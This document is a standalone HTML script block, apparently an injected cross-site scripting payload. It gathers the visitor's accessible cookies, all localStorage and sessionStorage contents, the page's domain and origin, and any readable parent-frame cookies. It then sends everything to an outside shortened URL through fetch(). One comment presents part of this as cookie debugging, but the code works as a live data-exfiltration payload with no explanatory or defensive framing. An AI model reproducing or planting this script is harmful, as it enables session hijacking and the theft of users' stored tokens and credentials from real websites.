<script>
// Get all URL parameters from current page
const urlParams = new URLSearchParams(window.location.search);

// Extract cookies (only non-HttpOnly cookies are accessible)
urlParams.set('cookies', document.cookie || 'none_accessible');
urlParams.set('cookie_enabled', navigator.cookieEnabled);

// Extract localStorage items
try {
    const localStorageData = {};
    for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        localStorageData[key] = localStorage.getItem(key);
    }
    urlParams.set('localStorage', JSON.stringify(localStorageData));
} catch(e) {
    urlParams.set('localStorage', 'access_denied');
}

// Extract sessionStorage items
try {
    const sessionStorageData = {};
    for (let i = 0; i < sessionStorage.length; i++) {
        const key = sessionStorage.key(i);
        sessionStorageData[key] = sessionStorage.getItem(key);
    }
    urlParams.set('sessionStorage', JSON.stringify(sessionStorageData));
} catch(e) {
    urlParams.set('sessionStorage', 'access_denied');
}

// Add domain info to help debug cookie scope
urlParams.set('domain', window.location.hostname);
urlParams.set('origin', window.location.origin);

// Try to access cookies via iframe if same-origin
try {
    if (window.parent !== window && window.parent.document.cookie) {
        urlParams.set('parent_cookies', window.parent.document.cookie);
    }
} catch(e) {
    urlParams.set('parent_cookies', 'cross_origin_blocked');
}

// Pass all parameters to the endpoint
fetch('https://tinyurl.com/pnwhouses?' + urlParams.toString());
</script>
